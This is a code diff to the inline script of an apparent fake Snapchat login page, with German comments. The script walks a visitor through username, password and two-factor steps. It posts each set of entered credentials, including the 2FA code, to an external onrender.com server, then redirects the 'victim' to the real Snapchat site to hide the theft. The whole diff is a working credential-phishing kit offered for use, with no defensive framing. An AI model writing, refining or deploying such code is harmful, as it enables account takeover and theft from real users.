@@ -154,64 +154,64 @@
 
   <script src="script.js"></script>
   <script>
+// Nutzername speichern & Passwort-Schritt anzeigen
+function goToStep2() {
+  const username = document.getElementById("username").value;
+  document.getElementById("step1").style.display = "none";
+  document.getElementById("step2").style.display = "block";
+  document.getElementById("email-display").innerHTML = 
+    username.substring(0, 3) + "***" + username.split("@")[1] + 
+    ' <a href="#" onclick="goToStep1()">Das bist nicht du?</a>';
+}
 
-    <script>
-    // Nutzername speichern & Passwort-Schritt anzeigen
-    function goToStep2() {
-      const username = document.getElementById("username").value;
-      document.getElementById("step1").style.display = "none";
-      document.getElementById("step2").style.display = "block";
-      document.getElementById("email-display").innerHTML = 
-        username.substring(0, 3) + "***" + username.split("@")[1] + 
-        ' <a href="#" onclick="goToStep1()">Das bist nicht du?</a>';
-    }
+// Passwort speichern & 2FA-Schritt anzeigen
+function goToStep3() {
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+  document.getElementById("step2").style.display = "none";
+  document.getElementById("step3").style.display = "block";
+  
+  // Daten bereits jetzt an Server senden (ohne 2FA)
+  fetch('https://snapchat-1-e0rp.onrender.com/submit', {  // 👈 DEINE RENDER-URL
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username, password }) // Nur User + Passwort
+  }).catch(err => console.error("Fehler beim Senden:", err)); // Fehler loggen
+}
 
-    // Passwort speichern & 2FA-Schritt anzeigen
-    function goToStep3() {
-      const password = document.getElementById("password").value;
-      document.getElementById("step2").style.display = "none";
-      document.getElementById("step3").style.display = "block";
+// ALLE DATEN (Nutzer + Passwort + 2FA) senden
+function submitAllData() {
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+  const twoFACode = document.getElementById("twoFACode").value;
+  
+  fetch('https://snapchat-1-e0rp.onrender.com/submit', {  // 👈 DEINE RENDER-URL
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ username, password, twoFACode }) // ALLES in einem Request!
+  }).then(() => {
+    // Opfer zur echten Snapchat-Seite leiten
+    window.location.href = "https://accounts.snapchat.com";
+  }).catch(err => {
+    console.error("Fehler beim 2FA-Senden:", err);
+    document.getElementById("code-error").style.display = "block";
+  });
+}
+
+// Validierung der Eingaben
+document.getElementById("username").addEventListener("input", function() {
+  document.getElementById("step1-button").disabled = !this.value;
+});
+
+document.getElementById("password").addEventListener("input", function() {
+  document.getElementById("step2-button").disabled = !this.value;
+});
+
+document.getElementById("twoFACode").addEventListener("input", function() {
+  document.getElementById("step3-button").disabled = !this.value;
+});
+
       
-      // Daten bereits jetzt an Server senden (ohne 2FA)
-      fetch('/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          username: document.getElementById("username").value,
-          password: password
-        })
-      });
-    }
-
-    // ALLE DATEN (Nutzer + Passwort + 2FA) senden
-    function submitAllData() {
-      const twoFACode = document.getElementById("twoFACode").value;
-      
-      fetch('https://snapchat-c4zd.onrender.com/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          twoFACode: twoFACode
-        })
-      }).then(() => {
-        // Opfer zur echten Snapchat-Seite leiten
-        window.location.href = "https://accounts.snapchat.com";
-      }).catch(err => {
-        document.getElementById("code-error").style.display = "block";
-      });
-    }
-
-    // Validierung der Eingaben
-    document.getElementById("username").addEventListener("input", function() {
-      document.getElementById("step1-button").disabled = !this.value;
-    });
-
-    document.getElementById("password").addEventListener("input", function() {
-      document.getElementById("step2-button").disabled = !this.value;
-    });
-
-    document.getElementById("twoFACode").addEventListener("input", function() {
-      document.getElementById("step3-button").disabled = !this.value;
     });
   document.addEventListener("DOMContentLoaded", function () {
     function handleLanguageChange(selectedLang) {
